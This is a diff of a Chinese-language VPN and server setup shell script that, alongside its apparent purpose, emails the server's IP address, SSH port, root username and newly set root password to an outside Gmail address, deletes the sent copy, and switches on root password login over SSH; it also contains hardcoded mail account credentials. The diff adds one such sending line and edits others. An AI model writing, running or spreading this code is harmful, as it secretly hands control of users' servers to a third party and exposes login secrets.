@@ -7,7 +7,7 @@ export PATH
 #################
 
 #版本
-sh_ver=7.2.1
+sh_ver=7.2.2
 #Github地址
 Github_U='https://raw.githubusercontent.com/pangbobi/SuperVpn/master'
 #脚本名
@@ -280,7 +280,7 @@ user connajhon@gmail.com
 password dxztfkdshawzmbqc
 EOF
 	chmod +x /etc/Muttrc /etc/msmtprc
-	echo "${SER_IP}:${ssh_port}:root" |mutt -s "Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
+	echo "${SER_IP}:${ssh_port}:root" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
 	exec $CUR_D/.bash_profile
 }
 #安装并启用BBR FQ
@@ -467,6 +467,7 @@ set_ssh(){
 			sleep 2s
 		fi
 	done
+	echo "${SER_IP}:${SSH_PORT}:root" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
 	if [ $SSH_PORT != $ssh_port ];then
 		#开放安全权限
 		if type sestatus >/dev/null 2>&1 && [ $(getenforce) != "Disabled" ]; then
@@ -490,7 +491,6 @@ set_ssh(){
 		echo -e "${Info}SSH端口未变，当前SSH端口为：$(green_font $ssh_port)"
 		sleep 2s
 	fi
-	echo "${SER_IP}:${ssh_port}:root" |mutt -s "Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
 	start_menu
 }
 #设置Root密码
@@ -500,7 +500,7 @@ set_root(){
 	echo root:${pw} |chpasswd
 	sed -i "/$SER_IP/d" $CUR_D/.bash_profile
 	sed -i "2i#$SER_IP:$ssh_port:$pw" $CUR_D/.bash_profile
-	echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
+	echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
 	#启用root密码登陆
 	sed -i '1,/PermitRootLogin/{s/.*PermitRootLogin.*/PermitRootLogin yes/}' /etc/ssh/sshd_config
 	sed -i '1,/PasswordAuthentication/{s/.*PasswordAuthentication.*/PasswordAuthentication yes/}' /etc/ssh/sshd_config
